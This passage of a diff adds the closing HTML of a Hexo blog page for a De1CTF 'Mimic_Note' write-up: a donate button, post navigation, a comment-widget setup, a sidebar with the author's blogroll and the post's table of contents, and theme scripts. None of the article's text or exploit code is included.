+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/12/nofile/" rel="next" title="nofile">
+                <i class="fa fa-chevron-left"></i> nofile
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/12/migration/" rel="prev" title="migration">
+                migration <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">60</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/helica" title="Helica" target="_blank">Helica</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="blessing" target="_blank">blessing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#de1ctf-Mimic-Note"><span class="nav-number">1.</span> <span class="nav-text">de1ctf Mimic_Note</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序逻辑"><span class="nav-number">1.2.</span> <span class="nav-text">程序逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">1.4.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后言"><span class="nav-number">1.5.</span> <span class="nav-text">后言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.6.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2019/12/12/mimic_note/';
+        this.page.identifier = '2019/12/12/mimic_note/';
+        this.page.title = 'De1CTF Mimic_Note';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: '',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
